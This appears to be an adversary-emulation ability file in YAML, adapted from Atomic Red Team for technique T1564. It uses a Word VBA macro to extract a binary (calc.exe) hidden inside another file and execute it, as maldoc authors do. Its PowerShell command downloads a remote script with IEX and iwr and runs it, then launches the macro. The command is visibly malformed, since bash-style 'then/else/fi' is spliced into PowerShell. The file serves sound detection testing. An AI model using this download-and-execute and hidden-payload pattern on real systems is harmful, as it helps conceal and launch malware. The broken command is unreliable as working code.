- id: 6afe288a-8a8b-4d33-a629-8d03ba9dad3a
  name: Extract binary files via VBA
  description: "This module extracts a binary (calc.exe) from inside of another binary.\
    \ \n\nIn the wild maldoc authors will use this technique to hide binaries inside\
    \ of files stored \nwithin the office document itself. An example of this technique\
    \ can be seen in sample\n\nf986040c7dd75b012e7dfd876acb33a158abf651033563ab068800f07f508226\n\
    \nThis sample contains a document inside of itself. Document 1 is the actual maldoc\
    \ itself, document 2\nis the same document without all the malicious code. Document\
    \ 1 will copy Document 2 to the file system\nand then \"peek\" inside of this\
    \ document and pull out the oleObject.bin file. Contained inside of this\noleObject.bin\
    \ file is a payload that is parsed out and executed on the file system."
  tactic: defense-evasion
  technique:
    attack_id: T1564
    name: Hide Artifacts
  platforms:
    windows:
      psh:
        command: 'try {; New-Object -COMObject "Word.Application" | Out-Null; Stop-Process
          -Name "winword"; exit 0; } catch { exit 1 }; then : ; else Write-Host "You
          will need to install Microsoft Word manually to meet this requirement";
          fi; $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt");
          $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin";
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
          -UseBasicParsing); Invoke-Maldoc -macroCode "$macro" -officeProduct "Word"
          -sub "Extract" -NoWrap'
        cleanup: Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1564
  - atomic-red-team
  - defense-evasion
  author: Atomic Red Team
  additional_info:
    dependencies:
    - description: 'Microsoft Word must be installed

        '
      prereq_command: "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n\
        \  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n"
      get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
        to meet this requirement"

        '
    technique_created: '2020-02-26T17:41:25.933Z'
    atomic_guid: 6afe288a-8a8b-4d33-a629-8d03ba9dad3a
    import_timestamp: '2025-07-29T03:49:31.845287Z'
